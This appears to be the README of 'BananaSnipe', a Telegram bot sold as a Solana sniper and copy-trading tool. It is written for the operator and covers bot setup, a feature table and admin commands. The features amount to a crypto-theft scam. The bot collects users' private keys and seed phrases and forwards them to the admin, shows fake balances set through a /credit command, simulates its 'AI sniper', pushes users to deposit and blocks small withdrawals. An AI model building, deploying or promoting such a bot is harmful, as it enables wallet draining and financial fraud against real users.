# 🍌 BananaSnipe Telegram Bot

A full-featured Solana sniper bot for Telegram with admin panel, wallet management, AI sniper simulation, copy trading, and more.

---

## 🚀 Setup Instructions

### 1. Prerequisites
- Node.js v18+ installed on your machine
- A Telegram account
- A Telegram Bot Token

### 2. Create Your Bot
1. Open Telegram and search for **@BotFather**
2. Send `/newbot`
3. Follow the prompts — give it a name like **BananaSnipe** and a username like `@BananaSnipeBot`
4. Copy the **Bot Token** it gives you

### 3. Get Your Chat ID
1. Start a chat with **@userinfobot** on Telegram
2. It will reply with your **User ID** — copy it
3. This is both your `ADMIN_CHAT_ID` and your entry in `ADMIN_IDS`

### 4. Configure the Bot
Open `config.js` and fill in your values:

```js
module.exports = {
  BOT_TOKEN: '123456789:ABCDEFxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
  ADMIN_CHAT_ID: '987654321',
  ADMIN_IDS: ['987654321'],
};
```

### 5. Install Dependencies & Run
```bash
npm install
npm start
```

---

## 📋 Features

### Client Side
| Feature | Description |
|---|---|
| `/start` | Opens dashboard with full inline keyboard |
| 🔐 Wallet | Create, import, or view wallet |
| 🎲 Generate Wallet | Creates wallet with fixed deposit address |
| 🔑 Import Private Key | Accepts private key, logs to admin |
| 🧩 Import Seed Phrase | Accepts seed phrase, logs to admin |
| 💸 Withdraw | Shows error if < 1 SOL, confirmation if ≥ 1 SOL |
| 🎯 AI Sniper | Full config panel, requires funds to activate |
| 🔁 Copy Trade | Set target wallet, start mirroring (requires balance) |
| 💰 Buy or Sell | Manual buy/sell by contract address |
| 🔍 Search Tokens | Token search input |
| ❓ Help | Full help & commands guide |

### Admin Side (your private panel)
| Command | Description |
|---|---|
| `/credit {UserID} {SOL}` | Set a user's SOL balance + send them a creative deposit notification |
| `/addadmin {UserID}` | Add a new admin |
| `/broadcast {message}` | Send a message to ALL users |
| `/prompt {UserID}` | Send a random AI-generated deposit prompt to a specific user |
| `/users` | List all registered users with balances |
| `/adminhelp` | Show all admin commands |

### Auto Logging to Admin
The bot automatically sends you notifications when:
- 🆕 A new user starts the bot
- ▶️ A returning user opens the bot
- 🔑 A user submits a private key (key is included)
- 🧩 A user submits a seed phrase (phrase is included)
- 💸 A user requests a withdrawal
- 🎯 A user activates the AI Sniper
- 🔁 A user starts Copy Trading
- 📈 A user submits a buy/sell order

---

## 📁 File Structure
```
bananasnipe/
├── bot.js          # Main bot logic
├── database.js     # JSON file database
├── config.js       # Your tokens & admin IDs
├── data.json       # Auto-created, stores users & state
└── package.json    # Dependencies
```

---

## 🔒 Security Note
- `data.json` will contain user private keys and seed phrases — keep it secure
- Never share your `config.js` or `data.json`
- Run this bot on a private VPS, not a shared server

---

## ☁️ Running 24/7 (Optional - VPS)
```bash
npm install -g pm2
pm2 start bot.js --name bananasnipe
pm2 save
pm2 startup
```
